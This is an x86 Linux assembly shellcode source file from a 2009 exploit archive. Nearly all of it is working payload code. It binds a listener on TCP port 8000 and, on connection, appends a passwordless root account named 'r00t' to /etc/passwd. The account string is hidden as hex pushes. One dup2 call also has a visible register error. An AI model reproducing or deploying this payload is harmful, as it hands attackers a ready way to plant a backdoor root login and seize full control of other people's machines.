;
; Title	: Bindport TCP/8000 & execve add user with access root
; os	: Linux x86
; size	: 225+ bytes
; IP	: localhost
; Port	: 8000
; Use	: nc localhost 8000
;
; Author	: Jonathan Salwan
; Mail		: submit AT shell-storm.org
; Web		: http://www.shell-storm.org
;
;
; More shellcodes in => http://www.shell-storm.org/shellcode/
;

section .text
global _start

_start:
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x1
push	byte	0x2

mov	eax, 	0x66
mov	ebx, 	0x1
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Socket();;;;;;;;;;;;;;;;;;;

mov 	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	byte	0x0
push	word	0x401f
push	word	0x2
mov	ebx, 	esp

push 	byte	0x10
push	ebx
push	edx

mov	eax, 	0x66
mov	ebx, 	0x2
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Bind();;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;
push	byte	0x1
push	edx

mov	eax,	0x66
mov	ebx,	0x4
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Listen();;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;
push	byte	0x0
push	byte	0x0
push	edx

mov	eax, 	0x66
mov	ebx, 	0x5
mov	ecx, 	esp
int 	0x80
;;;;;;;;;;;;;;;;;;;;Accept();;;;;;;;;;;;;;;;;;;

mov	edx, 	eax

;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;
mov	eax, 	0x3f
mov	ebx, 	edx
mov 	ebx, 	0x2
int	0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x1
int     0x80

mov     eax, 	0x3f
mov     ebx, 	edx
mov     ecx, 	0x0
int     0x80
;;;;;;;;;;;;;;;;;;;;Dup2();;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;Open();;;;;;;;;;;;;;;;;;;;;
push 	byte 	0x05
pop 	eax
xor 	ecx, 	ecx
push 	ecx
push 	0x64777373
push 	0x61702f2f
push 	0x6374652f
mov 	ebx, 	esp
mov 	cx, 	02001Q
int	0x80
;;;;;;;;;;;;;;;;;;;;Open();;;;;;;;;;;;;;;;;;;;;

mov 	ebx, 	eax

;;;;;;;;;;;;;;;;;;;;Write();;;;;;;;;;;;;;;;;;;;
push 	byte 	0x04
pop 	eax
xor 	edx, 	edx
push 	edx

push	word	0x6873
push	0x61622f6e
push	0x69622f3a
push	0x746f6f72
push	0x2f3a746f
push	0x6f723a30
push	0x3a303a3a
push	0x74303072
mov 	ecx, 	esp
push 	byte 0x1f
pop 	edx
int 	0x80
;;;;;;;;;;;;;;;;;;;;Write();;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;Close();;;;;;;;;;;;;;;;;;;
push 	byte 	0x06
pop 	eax
int 	0x80
;;;;;;;;;;;;;;;;;;;;;Close();;;;;;;;;;;;;;;;;;;

push 	byte 0x01
pop	eax
int 	0x80

; milw0rm.com [2009-06-08]